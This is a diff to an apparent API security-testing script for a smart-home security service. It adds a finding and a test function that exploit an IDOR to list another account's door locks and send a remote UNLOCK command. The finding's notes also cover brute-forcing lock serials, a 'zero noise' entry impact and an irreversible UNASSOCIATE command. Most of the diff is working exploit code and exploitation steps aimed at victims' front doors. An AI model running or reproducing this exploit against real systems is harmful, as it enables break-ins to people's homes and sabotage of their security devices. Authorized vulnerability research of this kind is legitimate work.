@@ -273,6 +273,23 @@ FINDINGS = [
                   'Note: ccCvv field exists in model; if API returns non-null CVV this is a PCI DSS prohibited storage violation. '
                   'Test: GET /v1/users/{victim_userId}/paymentMethods with own token; '
                   '200+paymentProfileId = CRITICAL. Check ccCvv field value.'),
+    Finding("F33", "CRITICAL", "Door Lock Physical Unlock IDOR via SID+Serial",
+            "yoda", "/doorlock/{sid}/{serial}/state", "GET+POST", None,
+            verified=False,
+            notes='APK: SimpliSafeRestService.java (classes14.dex). '
+                  'GET doorlock/{sid} -> List<SsDoorLockResponse>{serial, lockName, status, sid, uid, features, firmwareVersion}. '
+                  'POST doorlock/{sid}/{serial}/state body: {"state": "UNLOCK"|"LOCK"}. '
+                  'DoorLockAction enum: UNLOCK, LOCK. '
+                  'If sid not validated against JWT: '
+                  '(1) GET doorlock/{victim_sid} -> enumerate victim\'s lock serials + current lock status (locked/unlocked). '
+                  '(2) POST doorlock/{victim_sid}/{victim_serial}/state {"state":"UNLOCK"} -> physically unlock victim\'s front door. '
+                  'Serial prerequisite: (a) GET IDOR above, (b) physical observation of device, '
+                  '(c) brute force if serial namespace is small (inspect format from GET response). '
+                  'Impact: remote physical access to victim\'s home, zero noise (no alarm triggered by lock state change alone). '
+                  'Additional commands: DoorLockCommand{SCAN, UNASSOCIATE, PAIR_PINPAD, CALIBRATE} via POST doorlock/{sid}/{serial}/command. '
+                  'UNASSOCIATE removes the lock from the account — irreversible without re-pairing. '
+                  'Test: GET /v1/doorlock/{victim_sid} with own token; 200 = lock list + serials. '
+                  'Then POST /v1/doorlock/{victim_sid}/{serial}/state {"state":"UNLOCK"}; 200 = CRITICAL.'),
 ]
 
 
@@ -853,6 +870,36 @@ def test_face_idor(token, victim_sid, limit=5):
     if r:
         _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
                f"face/rated  {r.text[:150]}")
+
+
+def test_doorlock_idor(token, victim_sid, victim_serial=None):
+    """F33: Enumerate victim's door locks + attempt remote unlock."""
+    print(f"\n=== F33 — Door Lock IDOR (victim_sid={victim_sid}) ===")
+    r = get(f"{SERVICES['yoda']}/v1/doorlock/{victim_sid}", token=token)
+    if not r:
+        print("  Request failed"); return
+    if r.status_code == 200:
+        try:
+            locks = r.json() if isinstance(r.json(), list) else [r.json()]
+            serials = []
+            for lk in locks:
+                s = lk.get("serial")
+                name = lk.get("name")
+                status = lk.get("status", {})
+                serials.append(s)
+                _print("CRIT", 200, f"LOCK ENUM sid={victim_sid} serial={s} name={name} status={status}")
+            if victim_serial or (serials and serials[0]):
+                target_serial = victim_serial or serials[0]
+                r2 = post(f"{SERVICES['yoda']}/v1/doorlock/{victim_sid}/{target_serial}/state",
+                          token=token, json={"state": "UNLOCK"})
+                if r2 and r2.status_code in (200, 201, 204):
+                    _print("CRIT", r2.status_code, f"DOOR UNLOCKED sid={victim_sid} serial={target_serial}")
+                elif r2:
+                    _print("INFO", r2.status_code, f"unlock attempt: {r2.text[:100]}")
+        except Exception as e:
+            _print("CRIT", 200, f"200 OK (parse err: {e}) raw={r.text[:200]}")
+    else:
+        _print("INFO", r.status_code, f"doorlock/{victim_sid}: {r.text[:100]}")
 
 
 def test_payment_profile_idor(token, victim_uid):
